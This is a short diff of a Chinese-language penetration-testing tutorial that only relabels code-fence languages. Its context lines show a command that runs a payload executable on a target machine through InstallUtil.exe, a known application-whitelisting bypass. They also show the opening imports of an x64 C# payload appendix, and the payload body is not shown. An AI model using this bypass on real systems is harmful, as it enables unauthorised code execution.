@@ -33,7 +33,7 @@ Micropoor.exe
 ![](media/380382cb9c51c0a16a3d13b0b023985a.jpg)
 
 **靶机执行：**
-```
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe
 ```
 ![](media/8e03a632f426c981eaec67817eea1469.jpg)
@@ -41,7 +41,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ### 附录：Micropoor.cs
 **注：x64 payload**
 
-```c#
+```csharp
 using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;
 
 public class GQLBigHgUniLuVx {
